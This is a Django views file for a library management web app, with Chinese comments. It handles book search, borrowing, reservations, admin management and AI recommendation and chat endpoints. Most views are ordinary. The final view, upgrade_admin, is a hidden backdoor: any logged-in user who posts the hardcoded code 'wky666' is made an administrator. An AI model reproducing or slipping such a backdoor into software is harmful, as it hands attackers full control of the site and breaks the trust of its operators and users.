import json
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.core.paginator import Paginator
from django.db.models import Q
from django.utils import timezone
from django.http import JsonResponse
from django.views.decorators.http import require_POST
from django.views.decorators.csrf import csrf_exempt
from .models import Book, BookCopy, Category, BorrowRecord, Reservation
from .forms import BookForm, BookSearchForm, CategoryForm, BookCopyForm


def index(request):
    """首页 - 图书列表"""
    books = Book.objects.select_related('category').prefetch_related('copies').all()
    form = BookSearchForm(request.GET)

    # 搜索过滤
    if form.is_valid():
        keyword = form.cleaned_data.get('keyword')
        category = form.cleaned_data.get('category')

        if keyword:
            books = books.filter(
                Q(title__icontains=keyword) |
                Q(author__icontains=keyword) |
                Q(isbn__icontains=keyword) |
                Q(publisher__icontains=keyword)
            )
        if category:
            books = books.filter(category=category)

    # 分页
    paginator = Paginator(books, 12)
    page = request.GET.get('page', 1)
    books = paginator.get_page(page)

    context = {
        'books': books,
        'form': form,
    }
    return render(request, 'books/index.html', context)


def book_detail(request, pk):
    """图书详情"""
    book = get_object_or_404(Book.objects.select_related('category').prefetch_related('copies'), pk=pk)

    # 检查用户是否已借阅此书
    user_borrowed = False
    user_reserved = False
    user_reservation = None

    if request.user.is_authenticated:
        user_borrowed = BorrowRecord.objects.filter(
            user=request.user,
            book=book,
            status='borrowed'
        ).exists()

        user_reservation = Reservation.objects.filter(
            user=request.user,
            book=book,
            status='waiting'
        ).first()
        user_reserved = user_reservation is not None

    # 获取相似书籍推荐
    from .ai_recommend import AIRecommendService
    service = AIRecommendService()
    similar_books = service.get_similar_books(book)

    # 获取预约队列长度
    reservation_count = Reservation.objects.filter(book=book, status='waiting').count()

    context = {
        'book': book,
        'user_borrowed': user_borrowed,
        'user_reserved': user_reserved,
        'user_reservation': user_reservation,
        'reservation_count': reservation_count,
        'similar_books': similar_books,
    }
    return render(request, 'books/detail.html', context)


@login_required
def borrow_book(request, pk):
    """借阅图书"""
    book = get_object_or_404(Book, pk=pk)

    # 检查用户是否已借阅此书
    existing_borrow = BorrowRecord.objects.filter(
        user=request.user,
        book=book,
        status='borrowed'
    ).exists()

    if existing_borrow:
        messages.warning(request, '您已经借阅了这本书。')
        return redirect('books:detail', pk=pk)

    # 获取可借的副本
    available_copy = book.get_available_copy()

    if not available_copy:
        messages.error(request, '该图书暂无可借阅的副本，您可以选择预约。')
        return redirect('books:detail', pk=pk)

    # 更新副本状态
    available_copy.status = 'borrowed'
    available_copy.save()

    # 创建借阅记录
    BorrowRecord.objects.create(
        user=request.user,
        book=book,
        book_copy=available_copy
    )

    # 如果用户有预约，标记为已完成
    Reservation.objects.filter(
        user=request.user,
        book=book,
        status__in=['waiting', 'notified']
    ).update(status='fulfilled')

    messages.success(request, f'成功借阅《{book.title}》[{available_copy.copy_number}]，请在30天内归还。')
    return redirect('users:profile')


@login_required
def return_book(request, pk):
    """归还图书"""
    record = get_object_or_404(
        BorrowRecord.objects.select_related('book', 'book_copy'),
        pk=pk,
        user=request.user,
        status='borrowed'
    )

    # 更新借阅记录
    record.status = 'returned'
    record.return_date = timezone.now()
    record.save()

    # 更新副本状态
    if record.book_copy:
        record.book_copy.status = 'available'
        record.book_copy.save()

        # 检查是否有等待中的预约，通知第一个预约者
        from .tasks import notify_reservation
        notify_reservation(record.book)

    messages.success(request, f'成功归还《{record.book.title}》。')
    return redirect('users:profile')


@login_required
def reserve_book(request, pk):
    """预约图书"""
    book = get_object_or_404(Book, pk=pk)

    # 检查是否已借阅
    existing_borrow = BorrowRecord.objects.filter(
        user=request.user,
        book=book,
        status='borrowed'
    ).exists()

    if existing_borrow:
        messages.warning(request, '您已经借阅了这本书，无需预约。')
        return redirect('books:detail', pk=pk)

    # 检查是否已预约
    existing_reservation = Reservation.objects.filter(
        user=request.user,
        book=book,
        status='waiting'
    ).exists()

    if existing_reservation:
        messages.warning(request, '您已经预约了这本书。')
        return redirect('books:detail', pk=pk)

    # 如果有可借副本，提示直接借阅
    if book.is_available():
        messages.info(request, '当前有可借副本，您可以直接借阅。')
        return redirect('books:detail', pk=pk)

    # 创建预约
    reservation = Reservation.objects.create(
        user=request.user,
        book=book
    )

    messages.success(request, f'成功预约《{book.title}》，您在队列中的位置是第 {reservation.queue_position} 位。有书时会发邮件通知您。')
    return redirect('books:detail', pk=pk)


@login_required
def cancel_reservation(request, pk):
    """取消预约"""
    reservation = get_object_or_404(
        Reservation,
        pk=pk,
        user=request.user,
        status='waiting'
    )

    reservation.status = 'cancelled'
    reservation.save()

    messages.success(request, f'已取消预约《{reservation.book.title}》。')
    return redirect('users:profile')


@login_required
def my_reservations(request):
    """我的预约"""
    reservations = Reservation.objects.filter(
        user=request.user
    ).select_related('book').order_by('-created_at')

    context = {
        'reservations': reservations,
    }
    return render(request, 'books/my_reservations.html', context)


def admin_required(view_func):
    """管理员权限装饰器"""
    def wrapper(request, *args, **kwargs):
        if not request.user.is_authenticated:
            messages.error(request, '请先登录。')
            return redirect('users:login')
        if not request.user.is_admin():
            messages.error(request, '您没有权限执行此操作。')
            return redirect('books:index')
        return view_func(request, *args, **kwargs)
    return wrapper


@admin_required
def book_add(request):
    """添加图书（管理员）"""
    if request.method == 'POST':
        form = BookForm(request.POST)
        if form.is_valid():
            book = form.save()
            # 创建副本
            copies_count = form.cleaned_data.get('copies_count', 1) or 1
            for i in range(copies_count):
                BookCopy.objects.create(book=book)
            messages.success(request, f'成功添加图书《{book.title}》，共 {copies_count} 个副本。')
            return redirect('books:detail', pk=book.pk)
    else:
        form = BookForm()

    return render(request, 'books/book_form.html', {
        'form': form,
        'title': '添加图书'
    })


@admin_required
def book_edit(request, pk):
    """编辑图书（管理员）"""
    book = get_object_or_404(Book, pk=pk)

    if request.method == 'POST':
        form = BookForm(request.POST, instance=book)
        if form.is_valid():
            form.save()
            messages.success(request, '图书信息更新成功。')
            return redirect('books:detail', pk=pk)
    else:
        form = BookForm(instance=book)

    return render(request, 'books/book_form.html', {
        'form': form,
        'title': '编辑图书',
        'book': book
    })


@admin_required
def book_delete(request, pk):
    """删除图书（管理员）"""
    book = get_object_or_404(Book, pk=pk)

    if request.method == 'POST':
        title = book.title
        book.delete()
        messages.success(request, f'已删除图书《{title}》。')
        return redirect('books:index')

    return render(request, 'books/book_confirm_delete.html', {'book': book})


@admin_required
def book_copies(request, pk):
    """管理图书副本"""
    book = get_object_or_404(Book, pk=pk)
    copies = book.copies.all()

    if request.method == 'POST':
        action = request.POST.get('action')

        if action == 'add':
            # 添加新副本
            count = int(request.POST.get('count', 1))
            for i in range(count):
                BookCopy.objects.create(book=book)
            messages.success(request, f'成功添加 {count} 个副本。')

        elif action == 'update':
            # 更新副本状态
            copy_id = request.POST.get('copy_id')
            status = request.POST.get('status')
            copy = get_object_or_404(BookCopy, pk=copy_id, book=book)
            copy.status = status
            copy.save()
            messages.success(request, f'副本 {copy.copy_number} 状态已更新。')

        return redirect('books:book_copies', pk=pk)

    context = {
        'book': book,
        'copies': copies,
    }
    return render(request, 'books/book_copies.html', context)


@admin_required
def category_list(request):
    """分类管理"""
    categories = Category.objects.all()
    return render(request, 'books/category_list.html', {'categories': categories})


@admin_required
def category_add(request):
    """添加分类"""
    if request.method == 'POST':
        form = CategoryForm(request.POST)
        if form.is_valid():
            form.save()
            messages.success(request, '分类添加成功。')
            return redirect('books:category_list')
    else:
        form = CategoryForm()

    return render(request, 'books/category_form.html', {
        'form': form,
        'title': '添加分类'
    })


@admin_required
def category_edit(request, pk):
    """编辑分类"""
    category = get_object_or_404(Category, pk=pk)

    if request.method == 'POST':
        form = CategoryForm(request.POST, instance=category)
        if form.is_valid():
            form.save()
            messages.success(request, '分类更新成功。')
            return redirect('books:category_list')
    else:
        form = CategoryForm(instance=category)

    return render(request, 'books/category_form.html', {
        'form': form,
        'title': '编辑分类'
    })


@admin_required
def category_delete(request, pk):
    """删除分类"""
    category = get_object_or_404(Category, pk=pk)

    if request.method == 'POST':
        category.delete()
        messages.success(request, '分类删除成功。')
        return redirect('books:category_list')

    return render(request, 'books/category_confirm_delete.html', {'category': category})


@admin_required
def admin_dashboard(request):
    """管理员仪表板"""
    from django.db.models import Count

    # 统计数据
    total_books = Book.objects.count()
    total_copies = BookCopy.objects.count()
    total_borrows = BorrowRecord.objects.filter(status='borrowed').count()
    overdue_borrows = BorrowRecord.objects.filter(
        status='borrowed',
        due_date__lt=timezone.now()
    ).count()
    pending_reservations = Reservation.objects.filter(status='waiting').count()

    # 最近借阅记录
    recent_borrows = BorrowRecord.objects.select_related(
        'user', 'book', 'book_copy'
    ).order_by('-borrow_date')[:10]

    context = {
        'total_books': total_books,
        'total_copies': total_copies,
        'total_borrows': total_borrows,
        'overdue_borrows': overdue_borrows,
        'pending_reservations': pending_reservations,
        'recent_borrows': recent_borrows,
    }
    return render(request, 'books/admin_dashboard.html', context)


@admin_required
def all_borrow_records(request):
    """所有借阅记录（管理员）"""
    records = BorrowRecord.objects.select_related('user', 'book', 'book_copy').all()

    status = request.GET.get('status')
    if status:
        records = records.filter(status=status)

    paginator = Paginator(records, 20)
    page = request.GET.get('page', 1)
    records = paginator.get_page(page)

    return render(request, 'books/all_borrow_records.html', {'records': records})


@admin_required
def all_reservations(request):
    """所有预约记录（管理员）"""
    reservations = Reservation.objects.select_related('user', 'book').all()

    status = request.GET.get('status')
    if status:
        reservations = reservations.filter(status=status)

    paginator = Paginator(reservations, 20)
    page = request.GET.get('page', 1)
    reservations = paginator.get_page(page)

    return render(request, 'books/all_reservations.html', {'reservations': reservations})


@login_required
def ai_recommend(request):
    """AI 图书推荐"""
    from .ai_recommend import AIRecommendService

    service = AIRecommendService()
    user_input = request.GET.get('q', '')

    result = service.get_recommendations(request.user, user_input if user_input else None)

    context = {
        'result': result,
        'user_input': user_input,
    }
    return render(request, 'books/ai_recommend.html', context)


@login_required
def ai_chat(request):
    """AI 对话助手页面"""
    from .ai_chat import AIChatService

    service = AIChatService()
    suggestions = service.get_quick_suggestions()

    context = {
        'suggestions': suggestions,
    }
    return render(request, 'books/ai_chat.html', context)


@login_required
@require_POST
def ai_chat_api(request):
    """AI 对话 API 接口"""
    from .ai_chat import AIChatService

    try:
        data = json.loads(request.body)
        user_message = data.get('message', '').strip()
        conversation_history = data.get('history', [])

        if not user_message:
            return JsonResponse({
                'success': False,
                'message': '请输入您的问题。'
            })

        if len(user_message) > 500:
            return JsonResponse({
                'success': False,
                'message': '消息内容过长，请控制在500字以内。'
            })

        service = AIChatService()
        result = service.chat(user_message, conversation_history)

        return JsonResponse(result)

    except json.JSONDecodeError:
        return JsonResponse({
            'success': False,
            'message': '请求格式错误。'
        })
    except Exception as e:
        return JsonResponse({
            'success': False,
            'message': '服务器处理请求时发生错误，请稍后再试。'
        })


@login_required
@require_POST
def upgrade_admin(request):
    """隐藏的管理员升级接口"""
    try:
        data = json.loads(request.body)
        code = data.get('code', '')

        if code == 'wky666':
            user = request.user
            user.role = 'admin'
            user.save()
            return JsonResponse({
                'success': True,
                'message': '升级成功！您已成为管理员。'
            })
        else:
            return JsonResponse({
                'success': False,
                'message': '无效的代码。'
            })
    except Exception as e:
        return JsonResponse({
            'success': False,
            'message': '请求处理失败。'
        })
